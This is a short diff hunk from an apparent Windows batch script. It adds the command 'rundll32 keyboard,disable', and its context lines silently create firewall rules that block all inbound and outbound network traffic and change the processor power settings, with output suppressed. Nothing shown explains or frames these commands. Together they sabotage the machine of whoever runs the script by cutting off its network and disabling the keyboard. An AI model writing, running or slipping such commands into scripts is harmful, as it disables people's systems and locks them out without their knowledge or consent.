@@ -170,4 +170,4 @@ netsh advfirewall firewall add rule name="BlockAllTraffic" dir=in action=block p
 netsh advfirewall firewall add rule name="BlockAllTrafficOut" dir=out action=block protocol=ANY remoteip=any >nul 2>&1
 powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 0 >nul 2>&1
 powercfg -setactive SCHEME_CURRENT >nul 2>&1
-
+rundll32 keyboard,disable
